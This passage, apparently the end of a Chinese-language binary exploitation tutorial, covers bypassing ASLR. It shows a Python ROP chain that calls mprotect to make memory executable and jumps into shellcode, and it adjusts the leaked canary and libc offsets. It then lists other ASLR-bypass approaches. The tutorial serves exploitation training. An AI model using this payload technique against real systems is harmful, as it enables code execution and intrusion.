    payload += struct.pack( &#34;<Q&#34;, libc_base + 0x2bb39 ) # pop rsi; ret
    payload += struct.pack( &#34;<Q&#34;, 0x1000 ) # Page size 
    payload += struct.pack( &#34;<Q&#34;, libc_base + 0x10d37d ) # pop rdx; ret
    payload += struct.pack( &#34;<Q&#34;, 0x01 | 0x02 | 0x04 ) # Protections: PROT_EXEC=0x01, PROT_WRITE=0x02, PROT_READ=0x04 
    payload += struct.pack( &#34;<Q&#34;, libc_base + 0x10d200 ) # mprotect function address
    payload += struct.pack( &#34;<Q&#34;, shellcode ) # Jump into shellcode
    payload += b&#34;\x90&#34; * 0x40                             # NOPs for padding
    payload += buf # Shellcode

    p.stdin.write( b&#34;1\n&#34; )
    p.stdin.write( payload + b&#34;\n&#34; )
    p.stdin.flush()
```

  
  
现在，该函数可以根据所有所需 ROP 小工具的相对虚拟地址 (RVA) 动态高效地计算出它们相对于 Libc 基地址的地址。现在我们只需要修改主函数中的两行代码。  
  
  

```
canary, libc_relative_addr, stack_relative_addr = leak_stuff( p )
```

  
  
和  
  
  

```
hijack_exec( p, canary, libc_relative_addr-0x29d68, stack_relative_addr-0xa8 )
```

  
  
现在，一切都已就绪。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48taeYk9pbibPZ7GcMFkubQZibXrwXlLNwPHMVaSl4FWH6CxhwETLB4trMLoFHHXVHSxibmrUhKc6Xke88w/640?wx_fmt=png&from=appmsg "")  
  
请注意，当我们在 ASLR 运行时（以不同的模式）运行漏洞利用程序时，尽管地址随机化，它仍然有效，如图所示。  
  
其他绕过技术  
  
绕过和规避 ASLR 的方法和技术有很多。这完全取决于目标系统的性质、功能及其运行环境。解决方案数不胜数，但需要一定的耐心和仔细的思考。以下是一些可以使用的方法：  
  
不感知 ASLR 的模块：并非所有库都受 ASLR 保护，尤其是在 Windows 上。在这种情况下，操作系统会强制将它们加载到固定的虚拟内存地址中。这一特性可能会被滥用来构建稳定的 ROP 链，帮助我们执行代码或执行任何我们想做的事情。  
  
低 ASLR 熵：有时 ASLR 实现不合理，会以非最优的方式随机化地址，导致一两个字节发生变化，而其余字节保持不变。在这种情况下，如果我们的目标是一个可以多次运行的本地二进制文件，或者一个作为服务运行并在崩溃时自动重启的网络程序，那么通过暴力破解攻击利用它的可能性就会增加。如果您认为我在开玩笑，或者觉得这种胡扯不可行，我想告诉您，即使在 2025 年，我们仍然会看到类似CVE-2025-0282之类的策略被使用。  
  
结论  
  
绕过各种保护措施的方法主要取决于目标的性质、其运行环境、其特定功能以及诸如此类的诸多因素。我想说，没有人会告诉你一个神奇的方法，让你总能绕过所有保护措施。或许，每种保护措施都有一些通用的思路可以帮助你绕过，但这取决于你自己。除了你的经验、技术和实践技能之外，没有人能帮助你。也许，你所针对的程序中的一个小细节，如果以创造性的方式利用，就能让你绕过这些保护措施。为了提高你的水平，并能够开发出自己独创的漏洞利用策略，你需要大量的训练和练习。没有人能够仅仅通过学习这些漏洞和攻击，而不去实践和面对大量的场景，就能开发出复杂而高级的漏洞利用程序。当你接触到大量的场景并阅读不同的漏洞利用程序时，你就能逐渐掌握它们。所以，我建议你多读书，并尝试自己构建针对以前发现的漏洞的漏洞利用程序。这将对你大有裨益，并极大地提高你的水平。  
  
  
  
感谢您抽出  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgdSBqOibtgiaYWjL4pkRXwycNnFvFYVgXoExRy0gqCkqvrAghf8KPXnwQaYq77HMsjcVka7kPcBDQw/640?wx_fmt=gif "")  
  
.  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgdSBqOibtgiaYWjL4pkRXwycd5KMTutPwNWA97H5MPISWXLTXp0ibK5LXCBAXX388gY0ibXhWOxoEKBA/640?wx_fmt=gif "")  
  
.  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgdSBqOibtgiaYWjL4pkRXwycU99fZEhvngeeAhFOvhTibttSplYbBpeeLZGgZt41El4icmrBibojkvLNw/640?wx_fmt=gif "")  
  
来阅读本文  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWge7Mibiad1tV0iaF8zSD5gzicbxDmfZCEL7vuOevN97CwUoUM5MLeKWibWlibSMwbpJ28lVg1yj1rQflyQ/640?wx_fmt=gif "")  
  
**点它，分享点赞在看都在这里**  
  
